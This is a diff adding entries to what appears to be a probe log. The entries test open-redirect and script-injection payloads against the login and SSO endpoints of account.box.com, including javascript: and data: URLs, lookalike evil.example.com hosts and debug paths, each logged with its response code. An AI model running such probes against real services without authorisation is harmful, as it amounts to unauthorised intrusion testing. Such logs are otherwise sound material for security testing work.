@@ -60,3 +60,17 @@ https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Ddata%3Atext%2
 https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Dhttps%3A%2F%2Faccount.box.com.evil.example.com -> 206
 https://account.box.com/login?redirect_url=%2Fdebug -> 206
 https://account.box.com/login?redirect_url=%2Fstatus -> 206
+
+## 2026-08-21 19:58:27 UTC account.box.com
+https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Djavascript%3Aalert(1 -> 206
+https://account.box.com/sso?redirect_url=https://httpbin.org/redirect-to?url=https://example.com -> 206
+https://account.box.com.evil.example.com` -> ERR <urlopen error [Errno -2] Name or service not known>
+https://account.box.com/sso?redirect_url=https://evil.example.com/path -> 206
+https://account.box.com/sso?redirect_url=javascript:alert(1 -> 206
+https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Djavascript%3Aalert%281%29 -> 206
+https://account.box.com/sso?redirect_url=data:text/html,<script>alert(1 -> 206
+https://account.box.com/sso?redirect_url=https://account.box.com.evil.example.com -> 206
+https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Dhttps%3A%2F%2Faccount.box.com.evil.example.com -> 206
+https://account.box.com/debug -> 206
+https://account.box.com/login?redirect_url=%2Fdebug -> 206
+https://account.box.com/status -> 206
